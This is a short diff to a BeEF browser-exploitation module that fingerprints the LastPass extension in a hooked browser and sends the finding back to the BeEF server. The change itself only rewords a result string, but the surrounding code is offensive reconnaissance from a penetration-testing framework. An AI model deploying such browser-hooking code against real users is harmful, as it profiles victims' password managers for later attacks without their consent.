@@ -35,7 +35,7 @@ beef.execute(function() {
 	} else if (typeof(lpdiv) != 'undefined' && lpdiv != null) { 
 		result = "Detected LastPass through presence of the <script> tag with id=hiddenlpsubmitdiv";
 	} else if ($j("script:contains(lastpass_iter)").length > 0) {
-		result = "Module - Detect LastPass: Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
+		result = "Detected LastPass through presense of the embedded <script> which includes references to lastpass_iter";
 	} 
 
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "lastpass="+result);
